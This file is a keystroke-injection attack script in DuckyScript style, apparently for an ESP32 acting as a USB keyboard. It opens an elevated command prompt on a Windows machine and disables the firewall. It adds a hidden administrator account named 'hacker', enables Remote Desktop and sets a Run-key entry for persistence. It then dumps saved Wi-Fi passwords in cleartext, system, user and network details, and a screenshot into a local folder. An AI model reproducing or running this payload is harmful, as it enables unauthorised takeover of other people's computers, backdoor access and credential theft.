REM --- Part 1: Open CMD as Administrator ---
DELAY 2000

DELAY 500
STRING cmd
CTRL SHIFT ENTER
DELAY 2500

DELAY 200

REM --- Part 2: Detect Desktop path and create dump folder ---
REM Try to get real Desktop path from registry (handles OneDrive & non-English)
STRING for /f "tokens=2*" %a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Desktop ^| findstr Desktop') do set DESKTOP=%b
ENTER
DELAY 800

REM --- Part 3: If Desktop not found, use C:\ESP32_Dump ---
STRING if not defined DESKTOP set DESKTOP=C:\ESP32_Dump
ENTER
DELAY 300
STRING if not exist "%DESKTOP%" mkdir "%DESKTOP%"
ENTER
DELAY 300
STRING echo Desktop path: %DESKTOP%
ENTER
DELAY 300

REM --- Part 4: Disable Windows Firewall ---
STRING netsh advfirewall set allprofiles state off
ENTER
DELAY 1000

REM --- Part 5: Add hidden admin user ---
STRING net user hacker P@ssw0rd123 /add
ENTER
DELAY 800
STRING net localgroup administrators hacker /add
ENTER
DELAY 800

REM --- Part 6: Hide user from login screen ---
STRING reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hacker /t REG_DWORD /d 0 /f
ENTER
DELAY 800

REM --- Part 7: Enable Remote Desktop ---
STRING reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
ENTER
DELAY 800
STRING netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
ENTER
DELAY 800

REM --- Part 8: Add to Startup (Persistence) ---
STRING reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemUpdate /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
ENTER
DELAY 800

REM --- Part 9: WiFi Password Dump ---
STRING netsh wlan export profile key=clear folder="%DESKTOP%\"
ENTER
DELAY 1500

REM --- Part 10: Save WiFi passwords to file ---
STRING netsh wlan show profiles | findstr ":" > "%DESKTOP%\wifi_profiles.txt"
ENTER
DELAY 800
STRING for /f "tokens=2 delims=:" %i in ('netsh wlan show profiles ^| findstr ":"') do @echo Profile: %i >> "%DESKTOP%\wifi_profiles.txt" && @netsh wlan show profile name="%i" key=clear | findstr "Key Content" >> "%DESKTOP%\wifi_profiles.txt" && @echo. >> "%DESKTOP%\wifi_profiles.txt"
ENTER
DELAY 2000

REM --- Part 11: System Info Dump ---
STRING systeminfo > "%DESKTOP%\systeminfo.txt"
ENTER
DELAY 1500

REM --- Part 12: List all users ---
STRING net user > "%DESKTOP%\users.txt"
ENTER
DELAY 800

REM --- Part 13: IP and Network Info ---
STRING ipconfig /all > "%DESKTOP%\network.txt"
ENTER
DELAY 800
STRING netstat -an > "%DESKTOP%\netstat.txt"
ENTER
DELAY 800

REM --- Part 14: Screenshot via PowerShell ---
STRING powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -m 250; $img = [System.Windows.Forms.Clipboard]::GetImage(); if ($img) { $img.Save('%DESKTOP%\screenshot.png') }"
ENTER
DELAY 2000
